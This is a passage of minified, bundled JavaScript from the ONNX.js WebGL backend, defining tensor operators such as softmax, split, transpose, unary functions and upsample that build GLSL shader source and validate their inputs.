norm_factor;\n      }`;return Object.assign(Object.assign({},softmaxComputeScaleProgramMetadata),{output:{dims:outputShape,type:input.type,textureType:types_1.TextureType.unpacked},shaderSource:shaderSource})},createSoftMaxProgramInfo=(inferenceHandler,input,logicalRowCount,featureCount,maxElementPerLogicalRow,normalizationPerLogicalRow)=>{const[textureWidth,textureHeight]=inferenceHandler.calculateTextureWidthAndHeight(input.dims,types_1.TextureType.unpacked),rank=input.dims.length;if(logicalRowCount<1||featureCount<1)throw new Error("Logical row count N and feature count D must be greater than or equal to 1");if(1!==maxElementPerLogicalRow.length||1!==normalizationPerLogicalRow.length)throw new Error("Dimensionality of the intermediate results should be 1");if(maxElementPerLogicalRow[0]!==logicalRowCount||normalizationPerLogicalRow[0]!==logicalRowCount)throw new Error("Shape of the intermediate results should be equal to logical row count");const shaderSource=`\n      float process(int[${rank}] indices) {\n\n      // get offset of current logical tensor index from the 2-D texture coordinates (TexCoords)\n      int offset = coordsToOffset(TexCoords, ${textureWidth}, ${textureHeight});\n\n      //determine the logical row for this index\n      int logical_row_index[1];\n      logical_row_index[0] = offset / ${featureCount};\n\n      float norm_factor = _Norm(logical_row_index);\n\n      // avoid possible division by 0\n      // if norm_facor is 0, all elements are zero\n      // if so, return 0\n      if(norm_factor == 0.0)\n        return 0.0;\n\n      return exp(_A(indices) - _Max(logical_row_index)) / norm_factor;\n    }`;return Object.assign(Object.assign({},softmaxProgramMetadata),{output:{dims:input.dims,type:input.type,textureType:types_1.TextureType.unpacked},shaderSource:shaderSource})},validateInputs=inputs=>{if(!inputs||1!==inputs.length)throw new Error("Softmax requires 1 input.");if("float32"!==inputs[0].type&&"float64"!==inputs[0].type)throw new Error("Invalid input type")}},"./lib/onnxjs/backends/webgl/ops/split.ts":(__unused_webpack_module,exports,__webpack_require__)=>{"use strict";Object.defineProperty(exports,"__esModule",{value:!0}),exports.parseSplitAttributes=exports.split=void 0;const attribute_with_cache_key_1=__webpack_require__("./lib/onnxjs/attribute-with-cache-key.ts"),util_1=__webpack_require__("./lib/onnxjs/util.ts"),types_1=__webpack_require__("./lib/onnxjs/backends/webgl/types.ts"),splitProgramMetadata={name:"Split",inputNames:["A"],inputTypes:[types_1.TextureType.unpacked]};exports.split=(inferenceHandler,inputs,attributes)=>{validateInputs(inputs);const axis=util_1.ShapeUtil.normalizeAxis(attributes.axis,inputs[0].dims.length),count=getProgramCount(inferenceHandler,inputs,axis,attributes),output=[];for(let i=0;i<count;++i)output.push(inferenceHandler.run(Object.assign(Object.assign({},splitProgramMetadata),{cacheHint:`${attributes.cacheKey};${i}`,get:()=>createSplitProgramInfo(inferenceHandler,inputs[0],attributes,axis,i)}),inputs));return output};exports.parseSplitAttributes=node=>{const axis=node.attributes.getInt("axis",0),split=node.attributes.getInts("split",[]),numOutputs=node.outputs.length;return(0,attribute_with_cache_key_1.createAttributeWithCacheKey)({axis:axis,split:split,numOutputs:numOutputs})};const getProgramCount=(inferenceHandler,inputs,axis,attributes)=>{const[,offsets]=util_1.SplitUtil.splitShape(inputs[0].dims,axis,attributes.split,attributes.numOutputs);return offsets.length},createSplitProgramInfo=(inferenceHandler,input,attributes,axis,index)=>{const[shapes,offsets]=util_1.SplitUtil.splitShape(input.dims,axis,attributes.split,attributes.numOutputs),offset=offsets[index],outputShape=shapes[index],shaderSource=`\n      float process(int indices[${outputShape.length}]) {\n        indices[${axis}] += ${offset};\n        return _A(indices);\n      }\n    `;return Object.assign(Object.assign({},splitProgramMetadata),{cacheHint:`${attributes.cacheKey}:${index}`,output:{dims:outputShape,type:input.type,textureType:types_1.TextureType.unpacked},shaderSource:shaderSource})},validateInputs=inputs=>{if(!inputs||1!==inputs.length)throw new Error("Split requires one input.");if("int8"!==inputs[0].type&&"uint8"!==inputs[0].type&&"int16"!==inputs[0].type&&"uint16"!==inputs[0].type&&"int32"!==inputs[0].type&&"uint32"!==inputs[0].type&&"float32"!==inputs[0].type&&"float64"!==inputs[0].type&&"bool"!==inputs[0].type)throw new Error("Invalid input type.")}},"./lib/onnxjs/backends/webgl/ops/squeeze.ts":(__unused_webpack_module,exports,__webpack_require__)=>{"use strict";Object.defineProperty(exports,"__esModule",{value:!0}),exports.parseSqueezeAttributes=exports.squeezeV13=exports.squeeze=void 0;const util_1=__webpack_require__("./lib/onnxjs/util.ts");exports.squeeze=(inferenceHandler,inputs,axes)=>{validateInputs(inputs);const outputShape=util_1.ShapeUtil.squeezeShape(inputs[0].dims,axes);return[inferenceHandler.reshapeUnpacked(inputs[0],outputShape)]};exports.squeezeV13=(inferenceHandler,inputs)=>(validateInputsV13(inputs),(0,exports.squeeze)(inferenceHandler,[inputs[0]],Array.from(inputs[1].integerData)));exports.parseSqueezeAttributes=node=>node.attributes.getInts("axes");const validateInputs=inputs=>{if(!inputs||1!==inputs.length)throw new Error("Squeeze requires 1 input.");if("string"===inputs[0].type)throw new Error("invalid input tensor types.")},validateInputsV13=inputs=>{if(!inputs||2!==inputs.length)throw new Error("Squeeze requires 2 inputs.");if("int32"!==inputs[1].type)throw new Error("Invalid input type.")}},"./lib/onnxjs/backends/webgl/ops/sum.ts":(__unused_webpack_module,exports,__webpack_require__)=>{"use strict";Object.defineProperty(exports,"__esModule",{value:!0}),exports.sum=void 0;const glsl_source_1=__webpack_require__("./lib/onnxjs/backends/webgl/glsl-source.ts"),types_1=__webpack_require__("./lib/onnxjs/backends/webgl/types.ts");exports.sum=(inferenceHandler,inputs)=>{validateInputs(inputs);const sumProgramMetadata={name:"Sum",inputNames:inputs.map(((v,i)=>`X${i}`)),inputTypes:new Array(inputs.length).fill(types_1.TextureType.unpacked)};return[inferenceHandler.run(Object.assign(Object.assign({},sumProgramMetadata),{get:()=>createSumProgramInfo(inferenceHandler,inputs,sumProgramMetadata)}),inputs)]};const createSumProgramInfo=(inferenceHandler,inputs,sumProgramMetadata)=>{const glsl=(0,glsl_source_1.getGlsl)(inferenceHandler.session.backend.glContext.version),outputShape=inputs[0].dims.slice(),shaderSource=`\n      void main() {\n        vec4 result = ${inputs.map(((v,i)=>`${glsl.texture2D}(X${i},TexCoords)`)).join(" + ")};\n        ${glsl.output} = result;\n      }\n    `;return Object.assign(Object.assign({},sumProgramMetadata),{output:{dims:outputShape,type:inputs[0].type,textureType:types_1.TextureType.unpacked},hasMain:!0,shaderSource:shaderSource})},validateInputs=inputs=>{if(!inputs||0===inputs.length)throw new Error("Sum requires inputs.");const length=inputs[0].dims.length;for(let i=1;i<inputs.length;i++){if(length!==inputs[i].dims.length)throw new Error("Input shapes are mismatched.");for(let j=0;j<length;j++)if(inputs[0].dims[j]!==inputs[i].dims[j])throw new Error("Input shapes are not matched.")}if("float32"!==inputs[0].type&&"float64"!==inputs[0].type)throw new Error("Invalid input type.");for(let i=1;i<inputs.length;i++)if(inputs[0].type!==inputs[i].type)throw new Error("Input types are not matched.")}},"./lib/onnxjs/backends/webgl/ops/tile.ts":(__unused_webpack_module,exports,__webpack_require__)=>{"use strict";Object.defineProperty(exports,"__esModule",{value:!0}),exports.tile=void 0;const operators_1=__webpack_require__("./lib/onnxjs/operators.ts"),types_1=__webpack_require__("./lib/onnxjs/backends/webgl/types.ts");exports.tile=(inferenceHandler,inputs)=>{validateInputs(inputs);const tileProgramMetadata={name:"Tile",inputNames:["A"],inputTypes:[types_1.TextureType.unpacked]};return[inferenceHandler.run(Object.assign(Object.assign({},tileProgramMetadata),{get:()=>createTileProgramInfo(inferenceHandler,inputs,tileProgramMetadata)}),inputs)]};const createTileProgramInfo=(handler,inputs,tileProgramMetadata)=>{const inputShape=inputs[0].dims.slice(),outputShape=new Array(inputShape.length),tileOps=[];for(let i=0;i<inputShape.length;i++)outputShape[i]=inputShape[i]*inputs[1].numberData[i],tileOps.push(`inputIdx[${i}] = int(mod(float(outputIdx[${i}]), ${inputShape[i]}.));`);const rank=outputShape.length,shaderSource=`\n      float process(int outputIdx[${rank}]) {\n        int inputIdx[${rank}];\n        ${tileOps.join("\n")}\n        return _A(inputIdx);\n      }\n    `;return Object.assign(Object.assign({},tileProgramMetadata),{output:{dims:outputShape,type:inputs[0].type,textureType:types_1.TextureType.unpacked},shaderSource:shaderSource})},validateInputs=inputs=>{if(!inputs||2!==inputs.length)throw new Error("Tile requires 2 input.");if(1!==inputs[1].dims.length)throw new Error("The second input shape must 1 dimension.");if(inputs[1].dims[0]!==inputs[0].dims.length)throw new Error("Invalid input shape.");if(-1===operators_1.NUMBER_TYPES.indexOf(inputs[0].type))throw new Error("Invalid input type.");if("int32"!==inputs[1].type&&"int16"!==inputs[1].type)throw new Error("Invalid repeat type.")}},"./lib/onnxjs/backends/webgl/ops/transpose.ts":(__unused_webpack_module,exports,__webpack_require__)=>{"use strict";Object.defineProperty(exports,"__esModule",{value:!0}),exports.parseTransposeAttributes=exports.transpose=void 0;const attribute_with_cache_key_1=__webpack_require__("./lib/onnxjs/attribute-with-cache-key.ts"),util_1=__webpack_require__("./lib/onnxjs/util.ts"),types_1=__webpack_require__("./lib/onnxjs/backends/webgl/types.ts"),transposeProgramMetadata={name:"Transpose",inputNames:["A"],inputTypes:[types_1.TextureType.unpacked]};exports.transpose=(inferenceHandler,inputs,attributes)=>{validateInputs(inputs);return[inferenceHandler.run(Object.assign(Object.assign({},transposeProgramMetadata),{cacheHint:attributes.cacheKey,get:()=>createTransposeProgramInfo(inferenceHandler,inputs[0],attributes.perm)}),inputs)]};exports.parseTransposeAttributes=node=>(0,attribute_with_cache_key_1.createAttributeWithCacheKey)({perm:node.attributes.getInts("perm",[])});const createTransposeProgramInfo=(inferenceHandler,input,perm)=>{const inputShape=input.dims;perm=getAdjustedPerm(inputShape,perm);const unpackedOutputShape=getOutputShape(inputShape,perm),rank=inputShape.length,shaderSource=`\n      ${getPermFunctionBody("perm",perm,rank)}\n      float process(int indices[${rank}]) {\n        int a[${rank}];\n        perm(a, indices);\n        return _A(a);\n      }`;return Object.assign(Object.assign({},transposeProgramMetadata),{output:{dims:unpackedOutputShape,type:input.type,textureType:types_1.TextureType.unpacked},shaderSource:shaderSource})},getAdjustedPerm=(inputShape,perm)=>(perm&&perm.length!==inputShape.length&&(perm=[...inputShape.keys()].reverse()),perm),getOutputShape=(inputShape,perm)=>(perm=getAdjustedPerm(inputShape,perm),util_1.ShapeUtil.sortBasedOnPerm(inputShape,perm)),getPermFunctionBody=(name,perm,rank)=>{const reverseFunc=[];reverseFunc.push(`void ${name}(out int a[${rank}], int src[${rank}]) {`);for(let i=0;i<rank;++i)reverseFunc.push(`\ta[${perm[i]}]=src[${i}];`);return reverseFunc.push("\t}"),reverseFunc.join("\n")},validateInputs=inputs=>{if(!inputs||1!==inputs.length)throw new Error("Transpose requires 1 input.");if("float32"!==inputs[0].type&&"float64"!==inputs[0].type)throw new Error("input should be float tensor")}},"./lib/onnxjs/backends/webgl/ops/uint8-encode.ts":(__unused_webpack_module,exports,__webpack_require__)=>{"use strict";Object.defineProperty(exports,"__esModule",{value:!0}),exports.encodeAsUint8=void 0;const glsl_source_1=__webpack_require__("./lib/onnxjs/backends/webgl/glsl-source.ts"),types_1=__webpack_require__("./lib/onnxjs/backends/webgl/types.ts");exports.encodeAsUint8=(inferenceHandler,input)=>{const outputShape=input.shape,glsl=(0,glsl_source_1.getGlsl)(inferenceHandler.session.backend.glContext.version),shaderSource=`\n    const float FLOAT_MAX = 1.70141184e38;\n    const float FLOAT_MIN = 1.17549435e-38;\n\n    bool isNaN(float val) {\n      return (val < 1.0 || 0.0 < val || val == 0.0) ? false : true;\n    }\n\n    highp vec4 encodeAsUint8(highp float v) {\n      if (isNaN(v)) {\n        return vec4(255, 255, 255, 255);\n      }\n\n      highp float av = abs(v);\n\n      if(av < FLOAT_MIN) {\n        return vec4(0.0, 0.0, 0.0, 0.0);\n      } else if(v > FLOAT_MAX) {\n        return vec4(0.0, 0.0, 128.0, 127.0) / 255.0;\n      } else if(v < -FLOAT_MAX) {\n        return vec4(0.0, 0.0,  128.0, 255.0) / 255.0;\n      }\n\n      highp vec4 c = vec4(0,0,0,0);\n\n      highp float e = floor(log2(av));\n      highp float m = exp2(fract(log2(av))) - 1.0;\n\n      c[2] = floor(128.0 * m);\n      m -= c[2] / 128.0;\n      c[1] = floor(32768.0 * m);\n      m -= c[1] / 32768.0;\n      c[0] = floor(8388608.0 * m);\n\n      highp float ebias = e + 127.0;\n      c[3] = floor(ebias / 2.0);\n      ebias -= c[3] * 2.0;\n      c[2] += floor(ebias) * 128.0;\n\n      c[3] += 128.0 * step(0.0, -v);\n\n      return c / 255.0;\n    }\n\n    void main() {\n      float value = ${glsl.texture2D}(X,TexCoords).r;\n      ${glsl.output} = encodeAsUint8(value);\n    }`,programInfo={name:"Uint8Encode",inputTypes:[types_1.TextureType.unpacked],inputNames:["X"],output:{dims:outputShape,type:input.tensor.type,textureType:types_1.TextureType.downloadUint8AsFloat},shaderSource:shaderSource,hasMain:!0};return inferenceHandler.executeProgram(programInfo,[input.tensor])}},"./lib/onnxjs/backends/webgl/ops/unary-op.ts":(__unused_webpack_module,exports,__webpack_require__)=>{"use strict";Object.defineProperty(exports,"__esModule",{value:!0}),exports.tanh=exports.tan=exports.sqrt=exports.sin=exports.sigmoid=exports.relu=exports.not=exports.neg=exports.log=exports.parseLeakyReluAttributes=exports.leakyRelu=exports.identity=exports.floor=exports.exp=exports.parseEluAttributes=exports.elu=exports.cos=exports.ceil=exports.clipV11=exports.parseClipAttributes=exports.clip=exports.atan=exports.asin=exports.acos=exports.abs=exports.glslTanh=exports.glslTan=exports.glslSqrt=exports.glslSigmoid=exports.glslRelu=exports.glslSin=exports.glslNot=exports.glslNeg=exports.glslLog=exports.glslLeakyRelu=exports.glslIdentity=exports.glslClip=exports.glslFloor=exports.glslExp=exports.glslElu=exports.glslCos=exports.glslCeil=exports.glslAtan=exports.glslAsin=exports.glslAcos=exports.glslAbs=void 0;const attribute_with_cache_key_1=__webpack_require__("./lib/onnxjs/attribute-with-cache-key.ts"),util_1=__webpack_require__("./lib/onnxjs/util.ts"),glsl_definitions_1=__webpack_require__("./lib/onnxjs/backends/webgl/glsl-definitions.ts"),glsl_source_1=__webpack_require__("./lib/onnxjs/backends/webgl/glsl-source.ts"),types_1=__webpack_require__("./lib/onnxjs/backends/webgl/types.ts");function glslAbs(){return glslBuiltinUnary("abs")}function glslAcos(){return glslBuiltinUnary("acos")}function glslAsin(){return glslBuiltinUnary("asin")}function glslAtan(){return glslBuiltinUnary("atan")}function glslCeil(){return glslBuiltinUnary("ceil")}function glslCos(){return glslBuiltinUnary("cos")}function glslElu(alpha){return{body:`\n  const float alpha = float(${alpha});\n\n  float elu_(float a) {\n    return a >= 0.0 ? a: (exp(a) - 1.0) * alpha;\n  }\n  vec4 elu_(vec4 v) {\n    return vec4(elu_(v.x), elu_(v.y), elu_(v.z), elu_(v.w));\n  }\n  `,name:"elu",type:glsl_definitions_1.FunctionType.ValueBased}}function glslExp(){return glslBuiltinUnary("exp")}function glslFloor(){return glslBuiltinUnary("floor")}function glslClip(min,max){return{body:`\n  const float min = float(${min});\n  const float max = float(${max});\n\n  float clip_(float a) {\n    return clamp(a, min, max);\n  }\n  vec4 clip_(vec4 v) {\n    return clamp(v, min, max);\n  }\n  `,name:"clip",type:glsl_definitions_1.FunctionType.ValueBased}}function glslIdentity(){const name="indentity";return{body:`\n  float ${name}_(float a) {\n    return a;\n  }\n  vec4 ${name}_(vec4 v) {\n    return v;\n  }\n  `,name:name,type:glsl_definitions_1.FunctionType.ValueBased}}function glslLeakyRelu(alpha){const name="leakyRelu";return{body:`\n  const float alpha = float(${alpha});\n\n  float ${name}_(float a) {\n    return a < 0.0 ? a * alpha : a;\n  }\n  vec4 ${name}_(vec4 v) {\n    return vec4(${name}_(v.x), ${name}_(v.y), ${name}_(v.z), ${name}_(v.w));\n  }\n  `,name:name,type:glsl_definitions_1.FunctionType.ValueBased}}function glslLog(){return glslBuiltinUnary("log")}function glslNeg(){return{body:"\n  float neg_(float a) {\n    return -a;\n  }\n  vec4 neg_(vec4 v) {\n    return -v;\n  }\n  ",name:"neg",type:glsl_definitions_1.FunctionType.ValueBased}}function glslNot(){return{body:"\n  float not_(float a) {\n    return float( ! bool(a) );\n  }\n  bool not_(bool a) {\n    return !a;\n  }\n  vec4 not_(vec4 v) {\n    return vec4(!bool(v.x), !bool(v.y), !bool(v.z), !bool(v.w));\n  }\n  bvec4 not_(bvec4 v) {\n    return bvec4(!v.x, !v.y, !v.z, !v.w);\n  }\n  ",name:"not",type:glsl_definitions_1.FunctionType.ValueBased}}function glslSin(){return glslBuiltinUnary("sin")}function glslRelu(){return{body:"\n  float relu_(float a) {\n    return max( a, 0.0 );\n  }\n  vec4 relu_(vec4 v) {\n    return max( v, 0.0 );\n  }\n  ",name:"relu",type:glsl_definitions_1.FunctionType.ValueBased}}function glslSigmoid(){return{body:"\n  float sigmoid_(float a) {\n    return 1.0 / (1.0 + exp(-a));\n  }\n  vec4 sigmoid_(vec4 v) {\n    return 1.0 / (1.0 + exp(-v));\n  }\n  ",name:"sigmoid",type:glsl_definitions_1.FunctionType.ValueBased}}function glslSqrt(){return glslBuiltinUnary("sqrt")}function glslTan(){return glslBuiltinUnary("tan")}function glslTanh(){return{body:"\n  float tanh_(float a) {\n    a = clamp(a, -10., 10.);\n    a = exp(2.*a);\n    return (a - 1.) / (a + 1.);\n  }\n  vec4 tanh_(vec4 v) {\n    v = clamp(v, -10., 10.);\n    v = exp(2.*v);\n    return (v - 1.) / (v + 1.);\n  }\n  ",name:"tanh",type:glsl_definitions_1.FunctionType.ValueBased}}function glslBuiltinUnary(name){return{body:`\n  float ${name}_(float a) {\n    return ${name}(a);\n  }\n  vec4 ${name}_(vec4 v) {\n    return ${name}(v);\n  }\n  `,name:name,type:glsl_definitions_1.FunctionType.ValueBased}}exports.glslAbs=glslAbs,exports.glslAcos=glslAcos,exports.glslAsin=glslAsin,exports.glslAtan=glslAtan,exports.glslCeil=glslCeil,exports.glslCos=glslCos,exports.glslElu=glslElu,exports.glslExp=glslExp,exports.glslFloor=glslFloor,exports.glslClip=glslClip,exports.glslIdentity=glslIdentity,exports.glslLeakyRelu=glslLeakyRelu,exports.glslLog=glslLog,exports.glslNeg=glslNeg,exports.glslNot=glslNot,exports.glslSin=glslSin,exports.glslRelu=glslRelu,exports.glslSigmoid=glslSigmoid,exports.glslSqrt=glslSqrt,exports.glslTan=glslTan,exports.glslTanh=glslTanh;const createElementwiseProgramInfoLoader=(handler,input,glslFunc,cacheKey)=>{const textureType=handler.session.pack?types_1.TextureType.packed:types_1.TextureType.unpacked,metadata={name:glslFunc.name,inputTypes:[textureType],inputNames:["A"],cacheHint:cacheKey};return Object.assign(Object.assign({},metadata),{get:()=>((handler,metadata,input,glslFunc)=>{const textureType=handler.session.pack?types_1.TextureType.packed:types_1.TextureType.unpacked,glsl=(0,glsl_source_1.getGlsl)(handler.session.backend.glContext.version);return Object.assign(Object.assign({},metadata),{output:{dims:input.dims,type:input.type,textureType:textureType},shaderSource:`\n     ${glslFunc.body}\n     void main() {\n       vec4 v = ${glsl.texture2D}(A, TexCoords);\n       v = ${glslFunc.name}_(v);\n       ${glsl.output} = v;\n     }\n     `,hasMain:!0})})(handler,metadata,input,glslFunc)})};exports.abs=(handler,inputs)=>[handler.run(createElementwiseProgramInfoLoader(handler,inputs[0],glslAbs()),inputs)];exports.acos=(handler,inputs)=>[handler.run(createElementwiseProgramInfoLoader(handler,inputs[0],glslAcos()),inputs)];exports.asin=(handler,inputs)=>[handler.run(createElementwiseProgramInfoLoader(handler,inputs[0],glslAsin()),inputs)];exports.atan=(handler,inputs)=>[handler.run(createElementwiseProgramInfoLoader(handler,inputs[0],glslAtan()),inputs)];exports.clip=(handler,inputs,attributes)=>[handler.run(createElementwiseProgramInfoLoader(handler,inputs[0],glslClip(attributes.min,attributes.max),attributes.cacheKey),inputs)];exports.parseClipAttributes=node=>(0,attribute_with_cache_key_1.createAttributeWithCacheKey)({min:node.attributes.getFloat("min",util_1.MIN_CLIP),max:node.attributes.getFloat("max",util_1.MAX_CLIP)});exports.clipV11=(handler,inputs)=>{const attributes=generateClipAttributesFromInputs(handler,inputs);return(0,exports.clip)(handler,[inputs[0]],attributes)};const generateClipAttributesFromInputs=(handler,inputs)=>{if(inputs.length>=3&&(!handler.session.isInitializer(inputs[1].dataId)||!handler.session.isInitializer(inputs[2].dataId)))throw new Error("dynamic clip attributes are not allowed");const min=inputs.length>=3?inputs[1].numberData[0]:util_1.MIN_CLIP,max=inputs.length>=3?inputs[2].numberData[0]:util_1.MAX_CLIP;return(0,attribute_with_cache_key_1.createAttributeWithCacheKey)({min:min,max:max})};exports.ceil=(handler,inputs)=>[handler.run(createElementwiseProgramInfoLoader(handler,inputs[0],glslCeil()),inputs)];exports.cos=(handler,inputs)=>[handler.run(createElementwiseProgramInfoLoader(handler,inputs[0],glslCos()),inputs)];exports.elu=(handler,inputs,attributes)=>[handler.run(createElementwiseProgramInfoLoader(handler,inputs[0],glslElu(attributes.alpha),attributes.cacheKey),inputs)];exports.parseEluAttributes=node=>(0,attribute_with_cache_key_1.createAttributeWithCacheKey)({alpha:node.attributes.getFloat("alpha",1)});exports.exp=(handler,inputs)=>[handler.run(createElementwiseProgramInfoLoader(handler,inputs[0],glslExp()),inputs)];exports.floor=(handler,inputs)=>[handler.run(createElementwiseProgramInfoLoader(handler,inputs[0],glslFloor()),inputs)];exports.identity=(handler,inputs)=>[handler.run(createElementwiseProgramInfoLoader(handler,inputs[0],glslIdentity()),inputs)];exports.leakyRelu=(handler,inputs,attributes)=>[handler.run(createElementwiseProgramInfoLoader(handler,inputs[0],glslLeakyRelu(attributes.alpha),attributes.cacheKey),inputs)];exports.parseLeakyReluAttributes=node=>(0,attribute_with_cache_key_1.createAttributeWithCacheKey)({alpha:node.attributes.getFloat("alpha",.01)});exports.log=(handler,inputs)=>[handler.run(createElementwiseProgramInfoLoader(handler,inputs[0],glslLog()),inputs)];exports.neg=(handler,inputs)=>[handler.run(createElementwiseProgramInfoLoader(handler,inputs[0],glslNeg()),inputs)];exports.not=(handler,inputs)=>[handler.run(createElementwiseProgramInfoLoader(handler,inputs[0],glslNot()),inputs)];exports.relu=(handler,inputs)=>[handler.run(createElementwiseProgramInfoLoader(handler,inputs[0],glslRelu()),inputs)];exports.sigmoid=(handler,inputs)=>[handler.run(createElementwiseProgramInfoLoader(handler,inputs[0],glslSigmoid()),inputs)];exports.sin=(handler,inputs)=>[handler.run(createElementwiseProgramInfoLoader(handler,inputs[0],glslSin()),inputs)];exports.sqrt=(handler,inputs)=>[handler.run(createElementwiseProgramInfoLoader(handler,inputs[0],glslSqrt()),inputs)];exports.tan=(handler,inputs)=>[handler.run(createElementwiseProgramInfoLoader(handler,inputs[0],glslTan()),inputs)];exports.tanh=(handler,inputs)=>[handler.run(createElementwiseProgramInfoLoader(handler,inputs[0],glslTanh()),inputs)]},"./lib/onnxjs/backends/webgl/ops/unpack.ts":(__unused_webpack_module,exports,__webpack_require__)=>{"use strict";Object.defineProperty(exports,"__esModule",{value:!0}),exports.createUnpackProgramInfoLoader=exports.createUnpackProgramInfo=void 0;const glsl_source_1=__webpack_require__("./lib/onnxjs/backends/webgl/glsl-source.ts"),types_1=__webpack_require__("./lib/onnxjs/backends/webgl/types.ts"),utils_1=__webpack_require__("./lib/onnxjs/backends/webgl/utils.ts"),packing_utils_1=__webpack_require__("./lib/onnxjs/backends/webgl/ops/packing-utils.ts"),unpackProgramMetadata={name:"unpack",inputNames:["A"],inputTypes:[types_1.TextureType.packed]};exports.createUnpackProgramInfo=(handler,input)=>{const rank=input.dims.length,channels=(0,packing_utils_1.getChannels)("rc",rank),innerDims=channels.slice(-2),coordsDataType=(0,utils_1.getCoordsDataType)(rank),unpackChannel=(0,packing_utils_1.unpackFromChannel)(),sourceCoords=0===input.dims.length?"":function getSourceCoords(rank,dims){if(1===rank)return"rc";let coords="";for(let i=0;i<rank;i++)coords+=dims[i],i<rank-1&&(coords+=",");return coords}(rank,channels),coords=rank<=1?"rc":`vec2(${innerDims.join(",")})`,shaderSource=`\n    ${unpackChannel}\n    void main() {\n      ${coordsDataType} rc = getOutputCoords();\n\n       // Sample the texture with the coords to get the rgba channel value.\n       vec4 packedInput = getA(${sourceCoords});\n\n       ${(0,glsl_source_1.getGlsl)(handler.session.backend.glContext.version).output} = vec4(getChannel(packedInput, ${coords}), 0, 0, 0);\n     }\n   `;return Object.assign(Object.assign({},unpackProgramMetadata),{hasMain:!0,output:{dims:input.dims,type:input.type,textureType:types_1.TextureType.unpacked},shaderSource:shaderSource})};exports.createUnpackProgramInfoLoader=(handler,input)=>Object.assign(Object.assign({},unpackProgramMetadata),{get:()=>(0,exports.createUnpackProgramInfo)(handler,input)})},"./lib/onnxjs/backends/webgl/ops/unsqueeze.ts":(__unused_webpack_module,exports,__webpack_require__)=>{"use strict";Object.defineProperty(exports,"__esModule",{value:!0}),exports.parseUnsqueezeAttributes=exports.unsqueezeV13=exports.unsqueeze=void 0;const util_1=__webpack_require__("./lib/onnxjs/util.ts");exports.unsqueeze=(inferenceHandler,inputs,axes)=>{validateInputs(inputs);const outputShape=util_1.ShapeUtil.unsqueezeShape(inputs[0].dims,axes);return[inferenceHandler.reshapeUnpacked(inputs[0],outputShape)]};exports.unsqueezeV13=(inferenceHandler,inputs)=>(validateInputsV13(inputs),(0,exports.unsqueeze)(inferenceHandler,[inputs[0]],Array.from(inputs[1].integerData)));exports.parseUnsqueezeAttributes=node=>node.attributes.getInts("axes");const validateInputs=inputs=>{if(!inputs||1!==inputs.length)throw new Error("Unsqueeze requires 1 input.");if("string"===inputs[0].type)throw new Error("invalid input tensor types.")},validateInputsV13=inputs=>{if(!inputs||2!==inputs.length)throw new Error("Unsqueeze requires 2 inputs.");if("int32"!==inputs[1].type)throw new Error("Invalid input type.")}},"./lib/onnxjs/backends/webgl/ops/upsample.ts":(__unused_webpack_module,exports,__webpack_require__)=>{"use strict";Object.defineProperty(exports,"__esModule",{value:!0}),exports.scalesValidation=exports.validateInputs=exports.parseUpsampleAttributes=exports.parseUpsampleAttributesV9=exports.parseUpsampleAttributesV7=exports.upsample=void 0;const attribute_with_cache_key_1=__webpack_require__("./lib/onnxjs/attribute-with-cache-key.ts"),glsl_source_1=__webpack_require__("./lib/onnxjs/backends/webgl/glsl-source.ts"),types_1=__webpack_require__("./lib/onnxjs/backends/webgl/types.ts"),upsampleProgramMetadata={name:"Upsample",inputNames:["X"],inputTypes:[types_1.TextureType.unpacked]};exports.upsample=(inferenceHandler,inputs,attributes)=>{(0,exports.validateInputs)(inputs,attributes);return[inferenceHandler.run(Object.assign(Object.assign({},upsampleProgramMetadata),{cacheHint:attributes.cacheKey,get:()=>createUpsampleProgramInfo(inferenceHandler,inputs,attributes)}),inputs)]};exports.parseUpsampleAttributesV7=node=>(0,exports.parseUpsampleAttributes)(node,7);exports.parseUpsampleAttributesV9=node=>(0,exports.parseUpsampleAttributes)(node,9);exports.parseUpsampleAttributes=(node,opset)=>{const isResize=opset>=10,mode=node.attributes.getString("mode","nearest");if("nearest"!==mode&&"linear"!==mode&&(opset<11||"cubic"!==mode))throw new Error(`unrecognized mode: ${mode}`);let scales=[];opset<9&&(scales=node.attributes.getFloats("scales"),(0,exports.scalesValidation)(scales,mode,isResize));const extrapolationValue=node.attributes.getFloat("extrapolation_value",0),coordinateTransformMode=opset>10?node.attributes.getString("coordinate_transformation_mode","half_pixel"):"asymmetric";if(-1===["asymmetric","pytorch_half_pixel","tf_half_pixel_for_nn","align_corners","tf_crop_and_resize","half_pixel"].indexOf(coordinateTransformMode))throw new Error(`coordinate_transform_mode '${coordinateTransformMode}' is not supported`);const needRoiInput="tf_crop_and_resize"===coordinateTransformMode,useExtrapolation=needRoiInput,nearestMode="nearest"===mode&&opset>=11?node.attributes.getString("nearest_mode","round_prefer_floor"):"";if(-1===["round_prefer_floor","round_prefer_ceil","floor","ceil",""].indexOf(nearestMode))throw new Error(`nearest_mode '${nearestMode}' is not supported`);const cubicCoefficientA=node.attributes.getFloat("cubic_coeff_a",-.75),excludeOutside=0!==node.attributes.getInt("exclude_outside",0);if(excludeOutside&&"cubic"!==mode)throw new Error("exclude_outside can be set to 1 only when mode is CUBIC.");const useNearest2xOptimization=opset<11||"nearest"===mode&&"asymmetric"===coordinateTransformMode&&"floor"===nearestMode;let roiInputIdx=0,scalesInputIdx=0,sizesInputIdx=0;return opset>10?node.inputs.length>2?(roiInputIdx=1,scalesInputIdx=2,sizesInputIdx=3):(scalesInputIdx=1,sizesInputIdx=2):9===opset&&(scalesInputIdx=1),(0,attribute_with_cache_key_1.createAttributeWithCacheKey)({opset:opset,isResize:isResize,mode:mode,scales:scales,extrapolationValue:extrapolationValue,coordinateTransformMode:coordinateTransformMode,useExtrapolation:useExtrapolation,needRoiInput:needRoiInput,nearestMode:nearestMode,cubicCoefficientA:cubicCoefficientA,excludeOutside:excludeOutside,useNearest2xOptimization:useNearest2xOptimization,roiInputIdx:roiInputIdx,scalesInputIdx:scalesInputIdx,sizesInputIdx:sizesInputIdx})};const createUpsampleProgramInfo=(inferenceHandler,inputs,attributes)=>{const glsl=(0,glsl_source_1.getGlsl)(inferenceHandler.session.backend.glContext.version),[inputWidth,inputHeight]=inferenceHandler.calculateTextureWidthAndHeight(inputs[0].dims,types_1.TextureType.unpacked),outputShape=inputs[0].dims.map(((dim,i)=>Math.floor(dim*attributes.scales[i]))),[outputWidth,outputHeight]=inferenceHandler.calculateTextureWidthAndHeight(outputShape,types_1.TextureType.unpacked),dim=outputShape.length,outputPitches=new Array(dim),inputPitches=new Array(dim);let precalculatedPitches=`\n      int output_pitches[${dim}];\n      int input_pitches[${dim}];\n      `;for(let 